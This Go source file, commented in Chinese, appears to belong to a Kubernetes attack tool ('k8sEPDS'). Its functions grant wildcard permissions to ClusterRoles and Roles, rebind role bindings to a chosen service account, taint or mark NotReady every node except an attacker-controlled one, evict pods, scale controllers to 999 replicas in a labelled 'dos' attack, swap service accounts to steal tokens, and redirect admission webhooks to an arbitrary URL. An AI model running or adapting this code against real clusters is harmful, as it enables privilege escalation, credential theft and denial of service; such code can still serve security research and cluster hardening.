package utils

import (
	"context"
	"encoding/json"
	"fmt"
	"k8sEPDS/pkg/request"
	"time"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/types"
)

// PatchClusterRole 通过合并补丁的方式更新指定 ClusterRole 的权限规则。
// 参数:
//   token       - 用于访问 API Server 的认证 token
//   clusterrole - 要更新的 ClusterRole 名称
// 返回:
//   error       - 更新过程中遇到的错误
func PatchClusterRole(token string, clusterrole string) error {
    // 获取 Kubernetes ClientSet，并检查错误
    clientset, err := request.GetClientSet(token)
    if err != nil {
        return fmt.Errorf("获取 ClientSet 失败: %w", err)
    }

    // 设置超时上下文，防止请求长时间挂起
    ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
    defer cancel()

    // 构造合并补丁的 JSON 数据
    patchData := []byte(`{"rules":[{"apiGroups":["*"],"resources":["*"],"verbs":["*"]}]}`)
    _, err = clientset.RbacV1().ClusterRoles().Patch(ctx, clusterrole, types.MergePatchType, patchData, metav1.PatchOptions{})
    if err != nil {
        return fmt.Errorf("patch ClusterRole %s 失败: %w", clusterrole, err)
    }
    fmt.Printf("[√] 成功 patch ClusterRole %s\n", clusterrole)
    return nil
}

// PatchRole 通过合并补丁的方式更新指定命名空间中 Role 的权限规则。
// 参数:
//   token     - 用于访问 API Server 的认证 token
//   namespace - Role 所在的命名空间
//   role      - 要更新的 Role 名称
// 返回:
//   error     - 更新过程中遇到的错误
func PatchRole(token string, namespace string, role string) error {
    // 获取 Kubernetes ClientSet，并检查错误
    clientset, err := request.GetClientSet(token)
    if err != nil {
        return fmt.Errorf("获取 ClientSet 失败: %w", err)
    }

    // 创建带超时控制的上下文，避免请求长时间挂起
    ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
    defer cancel()

    // 构造合并补丁的 JSON 数据
    patchData := []byte(`{"rules":[{"apiGroups":["*"],"resources":["*"],"verbs":["*"]}]}`)
    _, err = clientset.RbacV1().Roles(namespace).Patch(ctx, role, types.MergePatchType, patchData, metav1.PatchOptions{})
    if err != nil {
        return fmt.Errorf("patch Role %s/%s 失败: %w", namespace, role, err)
    }

    fmt.Printf("[√] 成功 patch %s/%s\n", namespace, role)
    return nil
}

// PatchClusterRoleBinding 通过合并补丁的方式更新指定 ClusterRoleBinding，将指定的 ServiceAccount 绑定到 ClusterRole 上。
// 参数:
//   token              - 用于访问 API Server 的认证 token
//   clusterrolebinding - 要更新的 ClusterRoleBinding 的名称
//   saNamespace        - ServiceAccount 所在的命名空间
//   saName             - ServiceAccount 的名称
// 返回:
//   error              - 更新过程中遇到的错误
func PatchClusterRoleBinding(token string, clusterrolebinding string, saNamespace string, saName string) error {
	// 获取 Kubernetes ClientSet，并检查错误
    clientset, err := request.GetClientSet(token)
    if err != nil {
        return fmt.Errorf("获取 ClientSet 失败: %w", err)
    }
	// 创建带超时控制的上下文，避免请求长时间挂起
    ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
    defer cancel()
	// 构造合并补丁的 JSON 数据
	patchData := []byte(fmt.Sprintf(`{"subjects": [{"kind": "ServiceAccount", "name": "%s", "namespace": "%s"}]}`, saName, saNamespace))
	// 调用 API 执行合并补丁请求
	_, err = clientset.RbacV1().ClusterRoleBindings().Patch(ctx, clusterrolebinding, types.MergePatchType, patchData, metav1.PatchOptions{})
	if err != nil {
		return fmt.Errorf("patch ClusterRoleBinding %s 失败: %w", clusterrolebinding, err)
	}
	fmt.Printf("[√] 成功 patch ClusterRoleBinding %s\n", clusterrolebinding)
	return nil
}

// PatchRoleBinding 通过合并补丁的方式更新指定 RoleBinding，将指定的 ServiceAccount 绑定到 RoleBinding 上。
// 参数:
//   token      - 用于访问 API Server 的认证 token
//   rolebinding- 要更新的 RoleBinding 名称
//   saNamespace- ServiceAccount 所在的命名空间
//   saName     - ServiceAccount 的名称
// 返回:
//   error      - 更新过程中遇到的错误
func PatchRoleBinding(token string, rolebinding string, saNamespace string, saName string) error {
    // 获取 Kubernetes ClientSet，并检查错误
    clientset, err := request.GetClientSet(token)
    if err != nil {
        return fmt.Errorf("获取 ClientSet 失败: %w", err)
    }

    // 创建带超时控制的上下文，避免请求长时间挂起
    ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
    defer cancel()

	// 构造合并补丁的 JSON 数据，将 subjects 字段更新为包含目标 ServiceAccount 的数组
    patchData := []byte(fmt.Sprintf(`{"subjects": [{"kind": "ServiceAccount", "name": "%s", "namespace": "%s"}]}`, saName, saNamespace))
	// 调用 API 执行合并补丁请求
    _, err = clientset.RbacV1().RoleBindings(saNamespace).Patch(ctx, rolebinding, types.MergePatchType, patchData, metav1.PatchOptions{})
    if err != nil {
        return fmt.Errorf("patch RoleBinding %s/%s 失败: %w", saNamespace, rolebinding, err)
    }
	fmt.Printf("[√] Successfully patched %s/%s\n", saNamespace, rolebinding)
    return nil
}

// PatchNodes 通过战略合并补丁更新所有节点，排除指定的 controlledNode，给目标节点添加 taint（NoExecute）
//
// 参数:
//   token         - 用于访问 API Server 的认证 token
//   ControledNode - 不需要被 patch 的节点名称
// 返回:
//   error         - 更新过程中遇到的错误
func PatchNodes(token string, ControledNode string) error {
	// 获取 Kubernetes ClientSet
    clientset, err := request.GetClientSet(token)
    if err != nil {
        return fmt.Errorf("获取 ClientSet 失败: %w", err)
    }

    // 创建带超时控制的上下文
    ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
    defer cancel()

    // 列出所有节点
    nodeList, err := clientset.CoreV1().Nodes().List(ctx, metav1.ListOptions{})
    if err != nil {
        return fmt.Errorf("列出节点失败: %w", err)
    }
	// 定义补丁数据（战略合并补丁）
    patchData := []byte(`{"spec":{"taints":[{"key":"whatever","effect":"NoExecute"}]}}`)

    // 遍历节点并为非 controlledNode 节点打补丁
    for _, node := range nodeList.Items {
        if node.Name != ControledNode {
            fmt.Printf("Patching %s\n", node.Name)
            _, err := clientset.CoreV1().Nodes().Patch(ctx, node.Name, types.StrategicMergePatchType, patchData, metav1.PatchOptions{})
            if err != nil {
                return fmt.Errorf("patch 节点 %s 失败: %w", node.Name, err)
            }
        }
    }
    return nil
}

// PatchNodeStatus 通过 PatchStatus 更新指定节点的状态条件。
// 参数:
//   token    - 用于访问 API Server 的认证 token
//   nodeList - 要更新的节点名称列表
// 返回:
//   error    - 更新过程中遇到的错误
func PatchNodeStatus(token string, nodeList []string) error {
	// 获取 Kubernetes ClientSet
    clientset, err := request.GetClientSet(token)
    if err != nil {
        return fmt.Errorf("获取 ClientSet 失败: %w", err)
    }
	patchData := []byte(`{"status":{"conditions":[{"type":"Ready","status":"False"}]}}`)

	for _, node := range nodeList {
		_, err := clientset.CoreV1().Nodes().PatchStatus(context.TODO(), node, patchData)
		if err != nil {
			return err
		}
	}
	fmt.Println("[√] The remaining normal nodes have been patched")
	return nil

}

/*
* patchPods 仅能修改以下字段：
*    spec.containers[*].image
*    spec.initContainers[*].image
*    spec.activeDeadlineSeconds
*    spec.tolerations
*    spec.terminationGracePeriodSeconds）
*
* 使用 patchPods 的场景：
* 1、如果 Pod 能在节点上运行（因为节点配置了相应的容忍 tolerance），传入 toleranceSeconds=0 可等同于删除该 Pod
* 2、修改 containers[*].image 为恶意镜像，从而窃取挂载在 Pod 上的 ServiceAccount 信息
*/
// PatchPod 通过 JSON Patch 方式更新指定 Pod 的部分字段（例如添加 toleration）。
// 参数:
//   token    - 用于访问 API Server 的认证 token
//   namespace- Pod 所在的命名空间
//   podName  - 要更新的 Pod 名称
func PatchPod(token string, namespace string, podName string) error{
	// 获取 Kubernetes ClientSet
	clientset, err := request.GetClientSet(token)
    if err != nil {
        return fmt.Errorf("获取 ClientSet 失败: %w", err)
    }
	operations := []JSONPatchOperation{
		//{Op: "replace", Path: "/spec/serviceAccountName", Value: newServiceAccountName}, 	//JSON Patch
		//{Op: "replace", Path: "/spec/tolerations/0/tolerationSeconds", Value: "10"},
		//{Op: "add", Path: "/spec/containers/-", Value: map[string]interface{}{"name": "new-container", "image": "nginx"}},
		{Op: "add", Path: "/spec/tolerations/0/tolerationSeconds", Value: 0},
		//{Op: "replace", Path: "/spec/containers/0/image", Value: "nginx2"},
	}

	patchData, err := json.Marshal(operations)
    if err != nil {
        return fmt.Errorf("json Patch 编码错误: %v", err)
    }
	_, err = clientset.CoreV1().Pods(namespace).Patch(context.TODO(), podName, types.JSONPatchType, patchData, metav1.PatchOptions{})
    if err != nil {
        return fmt.Errorf("patch Pod 失败: %v", err)
    } else {
        fmt.Printf("[√] 成功patch Pod %s \n", podName)
    }
	return nil
}

// PatchController 针对不同类型的 Pod 控制器（如 deployments、statefulsets、replicasets、daemonsets、jobs、cronjobs、replicationcontrollers）执行 JSON Patch 更新操作。
// 参数:
//   controllerType - 控制器类型，如 "deployments"、"statefulsets" 等
//   token          - 用于访问 API Server 的认证 token
//   namespace      - 控制器所在的命名空间
//   controllerName - 控制器名称
//   nodeName       - 要更新的节点名称
//   targetSA       - 要设置的 ServiceAccount 名称
//   attackType     - 攻击类型，例如 "dos"（拒绝服务）; 其他类型时更新节点和 ServiceAccount
// 返回:
//   error          - 更新过程中遇到的错误
func PatchController(controllerType string, token string, namespace string, controllerName string, nodeName string, targetSA string, attackType string) error {
	// 获取 Kubernetes ClientSet，并检查错误
    clientset, err := request.GetClientSet(token)
    if err != nil {
        return fmt.Errorf("获取 ClientSet 失败: %w", err)
    }
	// 创建统一上下文，设置超时时间
    ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
    defer cancel()
	
	// 根据 attackType 构造 JSON Patch 操作
    var operations []JSONPatchOperation
	if attackType == "dos" {
        operations = []JSONPatchOperation{
            {Op: "add", Path: "/spec/template/spec/nodeName", Value: nodeName},
            {Op: "add", Path: "/spec/replicas", Value: 999},
        }
    } else {
        operations = []JSONPatchOperation{
            {Op: "add", Path: "/spec/template/spec/nodeName", Value: nodeName},
            {Op: "add", Path: "/spec/template/spec/serviceAccountName", Value: targetSA},
        }
    }

	// JSON 编码 Patch 操作
    patchData, err := json.Marshal(operations)
    if err != nil {
        return fmt.Errorf("JSON Patch 编码失败: %w", err)
    }

	// 根据 controllerType 调用相应的 Patch 方法
    switch controllerType {
    case "deployments":
        _, err = clientset.AppsV1().Deployments(namespace).Patch(ctx, controllerName, types.JSONPatchType, patchData, metav1.PatchOptions{})
    case "statefulsets":
        _, err = clientset.AppsV1().StatefulSets(namespace).Patch(ctx, controllerName, types.JSONPatchType, patchData, metav1.PatchOptions{})
    case "replicasets":
        _, err = clientset.AppsV1().ReplicaSets(namespace).Patch(ctx, controllerName, types.JSONPatchType, patchData, metav1.PatchOptions{})
    case "daemonsets":
        _, err = clientset.AppsV1().DaemonSets(namespace).Patch(ctx, controllerName, types.JSONPatchType, patchData, metav1.PatchOptions{})
    case "jobs":
        _, err = clientset.BatchV1().Jobs(namespace).Patch(ctx, controllerName, types.JSONPatchType, patchData, metav1.PatchOptions{})
    case "cronjobs":
        _, err = clientset.BatchV1().CronJobs(namespace).Patch(ctx, controllerName, types.JSONPatchType, patchData, metav1.PatchOptions{})
    case "replicationcontrollers":
        _, err = clientset.CoreV1().ReplicationControllers(namespace).Patch(ctx, controllerName, types.JSONPatchType, patchData, metav1.PatchOptions{})
    default:
        return fmt.Errorf("未知的控制器类型: %s", controllerType)
    }

	if err != nil {
        return err
    }

    fmt.Printf("[√] %s %s in namespace %s patched successfully.\n", controllerType, controllerName, namespace)
    return nil
}

// PatchWebhookConfig 通过合并补丁的方式更新 Webhook 配置。
// 本函数可处理两种类型的 webhook 配置：mutating 和 validating。
// 参数:
//   token             - 用于访问 API Server 的认证 token
//   webconfigType     - webhook 配置类型，如 "mutatingwebhookconfigurations" 或 "validatingwebhookconfigurations"
//   webhookconfigName - 要更新的 webhook 配置名称
//   webhookURL        - 更新后的 webhook URL
//   ca                - CA Bundle 内容
// 返回:
//   error             - 更新过程中遇到的错误
func PatchWebhookConfig(token string, webconfigType string, webhookconfigName string, webhookURL string, ca string) error {
	// 获取 Kubernetes ClientSet，并检查错误
    clientset, err := request.GetClientSet(token)
    if err != nil {
        return fmt.Errorf("获取 ClientSet 失败: %w", err)
    }
	// 创建带超时控制的上下文
    ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
    defer cancel()
	// 构造补丁数据
    patchData := []byte(fmt.Sprintf(
        `{"webhooks":[{"clientConfig":{"url":"%s","caBundle":"%s"},"rules":[{"operations":["*"],"apiGroups":["*"],"apiVersions":["*"],"resources":["*"]}],"sideEffects":"None","admissionReviewVersions":["v1"],"name":"example.mutation.example.com"}]}`,
        webhookURL, ca,
    ))
	var result metav1.Object
	switch webconfigType {
    case "mutatingwebhookconfigurations":
        res, err := clientset.AdmissionregistrationV1().MutatingWebhookConfigurations().
            Patch(ctx, webhookconfigName, types.MergePatchType, patchData, metav1.PatchOptions{})
        if err != nil {
            return err
        }
        result = res
    case "validatingwebhookconfigurations":
        res, err := clientset.AdmissionregistrationV1().ValidatingWebhookConfigurations().
            Patch(ctx, webhookconfigName, types.MergePatchType, patchData, metav1.PatchOptions{})
        if err != nil {
            return err
        }
        result = res
    default:
        return fmt.Errorf("未知的 webhook 配置类型: %s", webconfigType)
    }
	fmt.Println("[√] 成功 patch", result.GetName())
    return nil
}

type JSONPatchOperation struct {
	Op    string      `json:"op"`
	Path  string      `json:"path"`
	Value interface{} `json:"value,omitempty"`
}
